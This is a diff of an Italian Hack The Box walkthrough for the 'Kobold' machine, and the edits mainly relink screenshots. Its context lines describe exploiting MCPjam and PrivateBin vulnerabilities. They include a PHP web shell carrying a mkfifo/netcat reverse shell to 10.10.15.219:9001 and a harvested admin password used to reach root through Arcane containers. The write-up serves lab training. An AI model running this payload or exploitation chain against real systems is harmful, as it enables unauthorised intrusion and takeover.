@@ -179,7 +179,7 @@ Vanno inseriti nel file `/etc/host`
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404144409.png)
 
 Si tratta del servizio **MCPjam versione 1.4.2**
-![[Pasted image 20260404144522.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404144522.png)
 ### CVE-2026-23744
 Questo servizio pare essere soggetto alla vulnerabilità `CVE-2026-23744` che può essere sfruttata con questo expoloit:
 https://github-.com/H1sok444/CVE-2026-23744-PoC
@@ -206,7 +206,7 @@ Sanitizziamo la shell con `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 Nella cartella `/home/ben` troviamo la user flag `user.txt`
 ## bin.kobold.htb
 Visitiamo il sottodominio bin.kobold.htb:
-![[Pasted image 20260404151232.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404151232.png)
 Si tratta del servizio **PrivateBin versione 2.0.2**
 Le versioni dalla 1.7.7 alla 2.0.3 sono esposte alla vulnerabilità path traversal **CVE-2025-64714** (GHSA-g2j9-g8r5-rg82):
 https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82
@@ -237,7 +237,7 @@ Inseriamo in **privatebin-data/data** questo script php:
 `echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.219 9001 >/tmp/f");?>' > pwn4.php`
 
 Mettiamoci in ascolto con `nc -lvnp 9001` e con Burpsuite lanciamo lo script php:
-![[Pasted image 20260404160354.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404160354.png)
 
 Otteniamo una shell.
 Accedendo alla directory `srv/cfg/conf.php`, possiamo ottenere informazioni sulla configurazione dell'ambiente. Questo conferma che PrivateBin è in esecuzione all'interno di un container Docker (utilizzando l'immagine `privatebin/nginx-fpm-alpine:2.0.2`) e rivela poi una password che possiamo utilizzare:
@@ -255,18 +255,18 @@ opt[12] = true   ; PDO::ATTR_PERSISTENT
 Password: **ComplexP@sswordAdmin1928**
 ## Arcane (porta 3552)
 Sulla porta 3552 è presente il servizio **Arcane**:
-![[Pasted image 20260404161622.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404161622.png)
 Possiamo accedere con le seguenti credenziali:
 username: **arcane**
 password: **ComplexP@sswordAdmin1928**
 
 Creiamo un container: **Containers->Create Containers** con la seguente configurazione:
-![[Pasted image 20260404162345.png]]
-![[Pasted image 20260404162424.png]]
-![[Pasted image 20260404162500.png]]
-![[Pasted image 20260404162538.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404162345.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404162424.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404162500.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404162538.png)
 Dopo aver creato il container andiamo nella schermata **Containers** e selezioniamo **Inspect**
-![[Pasted image 20260404162750.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404162750.png)
 Poi scegliamo **Shell**. 
 Da qui possiamo arrivare all root flag:
-![[Pasted image 20260404162923.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404162923.png)
